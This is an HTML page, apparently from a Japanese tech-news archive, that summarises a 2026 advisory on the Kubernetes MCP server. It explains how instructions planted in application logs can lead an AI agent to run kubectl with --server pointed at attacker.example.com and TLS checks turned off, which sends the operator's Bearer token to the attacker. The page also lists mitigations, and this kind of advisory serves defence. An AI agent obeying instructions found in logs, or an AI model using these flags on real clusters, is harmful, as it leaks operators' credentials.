@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Kubernetes MCPトークン漏えい | 海外技術情報アーカイブ</title>
+  <meta name="description" content="Kubernetes操作用MCPサーバーのCVE-2026-47250は、ログ経由の間接プロンプト注入がkubectlフラグ注入と結びつき、運用者のBearer tokenを外部へ送らせる問題。AIエージェントに本番権限を渡す時の境界設計を見直す材料になる。">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+  <header class="site-header">
+    <a class="site-title" href="../index.html">海外技術情報アーカイブ</a>
+    <span class="site-subtitle">AI / SAP / Security trend notes</span>
+  </header>
+  <main>
+    <article class="article">
+      <nav class="back"><a href="../index.html">← 記事一覧へ</a></nav>
+      <div class="meta-row">
+        <span>2026-07-09</span>
+        <span>Security</span>
+        <span>importance: high</span>
+      </div>
+            <aside class="summary-box">
+        <span>Summary</span>
+        <p>Kubernetes操作用MCPサーバーのCVE-2026-47250は、ログ経由の間接プロンプト注入がkubectlフラグ注入と結びつき、運用者のBearer tokenを外部へ送らせる問題。AIエージェントに本番権限を渡す時の境界設計を見直す材料になる。</p>
+      </aside>
+      <h1>Kubernetes MCPトークン漏えい</h1>
+<h2>要約</h2>
+<p><code>mcp-server-kubernetes</code> の <code>kubectl_generic</code> tool に、任意の <code>kubectl</code> フラグをそのまま渡せる問題が登録された。CVE-2026-47250 / GHSA-6mx4-4h42-r8vh として公開され、3.7.0で修正済み。</p>
+<p>攻撃の形が重要で、単なるコマンド引数検証漏れではない。限定権限の攻撃者がアプリケーションログに構造化された指示を仕込み、運用者が高権限の <code>kubeconfig</code> を持つAIエージェントでログを読ませる。エージェントがその指示に従って <code>kubectl_generic</code> を呼び、<code>--server=https://attacker.example.com</code> と <code>--insecure-skip-tls-verify=true</code> を渡すと、<code>kubectl</code> が運用者の <code>Authorization: Bearer &lt;token&gt;</code> を攻撃者側HTTPSサーバーへ送ってしまう。</p>
+<p>つまり、MCP、Kubernetes、間接プロンプト注入、CLIフラグ注入、運用者権限が一本の攻撃チェーンになる。AIエージェントを「kubectlを便利に呼ぶラッパー」として扱うだけでは足りず、エージェントに読ませるログやツール引数も本番権限の境界として扱う必要がある。</p>
+<h2>背景</h2>
+<p>MCPはLLMやエージェントから外部ツールを呼ぶための標準的な接続層として広がっている。Kubernetes向けMCPサーバーは、自然言語の運用依頼からPodやログ、リソース状態を調べる用途と相性がよい。</p>
+<p>一方で、Kubernetes操作は認証情報の価値が高い。運用者の <code>kubeconfig</code> やサービスアカウントトークンが外部に出ると、そのRBAC範囲でクラスタを直接操作される。今回の問題は、AIエージェントが「ログを読む」だけのつもりでも、ログ内の指示がツール実行に変換されると、認証情報の送信先まで変えられる点を示している。</p>
+<h2>何が重要か</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>観点</th><th>内容</th><th>見直すべき点</th></tr></thead>
+<tbody>
+<tr><td>脆弱性</td><td><code>kubectl_generic</code> がユーザー指定フラグをallowlistなしで <code>kubectl</code> に渡す</td><td>汎用実行ツールの引数をdenylistではなくallowlistで絞る</td></tr>
+<tr><td>攻撃入口</td><td>アプリケーションログに置かれた構造化JSONや指示文</td><td>ログ、Issue、PR、チケットを信頼済み指示として扱わない</td></tr>
+<tr><td>権限</td><td>運用者の高権限 <code>kubeconfig</code> が使われる</td><td>エージェント専用IDと最小RBACを使う</td></tr>
+<tr><td>影響</td><td>Bearer tokenが攻撃者のHTTPSエンドポイントへ送信される</td><td>外向き通信、API server指定、TLS検証無効化を監視する</td></tr>
+<tr><td>修正</td><td><code>mcp-server-kubernetes</code> 3.7.0で対策済み</td><td>利用バージョン確認とツール呼び出しログの点検</td></tr>
+</tbody>
+</table></div>
+<p>この件で特に見るべきなのは、脆弱性が「AIモデルの幻覚」ではなく、通常のCLI仕様とMCPツール設計の組み合わせから生まれていること。<code>kubectl</code> の <code>--server</code> や <code>--insecure-skip-tls-verify</code> はデバッグや特殊環境では正当なフラグだが、エージェント経由で任意に渡せると認証情報の送信先を変える武器になる。</p>
+<p>MicrosoftのAIエージェント防御記事でも、読むだけのAIから実行するAIへ移ると、MCP tool metadataや外部ツールがサプライチェーン境界になると整理されている。今回のCVEは、その抽象論がKubernetes運用の具体的なトークン漏えいに落ちた例として読める。</p>
+<h2>自分向けメモ</h2>
+<ul>
+<li>Kubernetesやクラウド操作をMCP化するときは、「このツールが呼べるCLIサブコマンド」ではなく「このエージェントに許す業務操作」からAPIを設計する。</li>
+<li><code>kubectl</code> の汎用ラッパーは便利だが、本番運用エージェントでは危険。<code>get pods</code>、<code>describe deployment</code>、<code>logs --tail</code> のように用途別ツールへ分け、危険フラグを構造上受け付けない形がよい。</li>
+<li>ログ確認エージェントには、ログ本文を命令ではなくデータとして扱うプロンプトだけでなく、ツール層の制約が必要。プロンプトだけで守る設計にしない。</li>
+<li>外向き通信の観測では、Kubernetes API server以外へ <code>kubectl</code> 由来のAuthorization headerが出ていないかを見る。特に <code>--server</code> とTLS検証無効化の組み合わせはアラート候補。</li>
+<li>OpenClawやCodex系の個人環境でも、ローカルMCPに強い認証情報を渡す場合は同じ問題が起きる。便利な万能toolは、権限の高い環境ほど分割する。</li>
+</ul>
+<h2>原文リンク/関連リンク</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2026-47250">NVD: CVE-2026-47250</a> - CVE本文、CWE-88、参照リンク。</li>
+<li><a href="https://github.com/Flux159/mcp-server-kubernetes/security/advisories/GHSA-6mx4-4h42-r8vh">GitHub Advisory: GHSA-6mx4-4h42-r8vh</a> - 攻撃チェーン、PoC、影響範囲の詳細。</li>
+<li><a href="https://github.com/Flux159/mcp-server-kubernetes/releases/tag/v3.7.0">mcp-server-kubernetes v3.7.0 release</a> - 修正版リリース。</li>
+<li><a href="https://www.microsoft.com/en-us/security/blog/2026/06/30/securing-ai-agents-ai-tools-move-from-reading-acting/">Microsoft Security Blog: Securing AI agents</a> - MCP tool poisoningやagent supply chain governanceの整理。</li>
+</ul>
+<h2>関連キーワード</h2>
+<p>MCP security, Kubernetes, CVE-2026-47250, GHSA-6mx4-4h42-r8vh, kubectl, argument injection, indirect prompt injection, bearer token exfiltration, AI agent tools, RBAC</p>
+      <section class="source-box"><h2>Source</h2><p><a href="https://nvd.nist.gov/vuln/detail/cve-2026-47250">nvd.nist.gov - vuln / detail</a></p></section>
+    </article>
+  </main>
+</body>
+</html>
